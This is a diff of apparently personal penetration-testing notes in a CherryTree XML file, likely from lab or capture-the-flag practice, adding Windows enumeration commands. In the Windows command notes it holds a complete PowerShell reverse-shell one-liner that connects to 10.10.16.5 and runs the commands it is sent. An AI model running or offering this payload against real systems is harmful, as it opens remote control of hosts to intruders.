@@ -319,7 +319,7 @@ Attacker:
     </node>
   </node>
   <node name="windows" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394181" ts_lastsave="1664784774">
-    <node name="cmd" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394591" ts_lastsave="1664784615">
+    <node name="cmd" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394591" ts_lastsave="1664800896">
       <rich_text>get hostname / pc name
 hostname
 
@@ -369,7 +369,7 @@ dir "search term*" /s
 
 powershell r_shell
 
-powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.5',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 </rich_text>
     </node>
     <node name="env_path" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394602" ts_lastsave="1655394612">
@@ -1104,7 +1104,7 @@ nmap --script-updatedb</rich_text>
       </node>
     </node>
   </node>
-  <node name="post_exploit_shell" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655814635" ts_lastsave="1664288663">
+  <node name="post_exploit_shell" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655814635" ts_lastsave="1664878183">
     <rich_text link="webs https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</rich_text>
     <rich_text>
 </rich_text>
@@ -1904,6 +1904,23 @@ enum all tasks
 
 netstat -ano
 check all open network interface</rich_text>
+    </node>
+    <node name="windows" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664878183" ts_lastsave="1664879583">
+      <rich_text>check privileges
+whoami /all
+
+check processes
+ps
+tasklist /v
+
+so far I found that unknown user run using tasklist /v might be ran as administrator
+
+check .net running 
+dir C:\Windows\Microsoft.NET\framework
+
+check firewall state 
+netsh firewall show state
+</rich_text>
     </node>
   </node>
   <node name="decrypt_key_ssh" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664288663" ts_lastsave="1664290655">
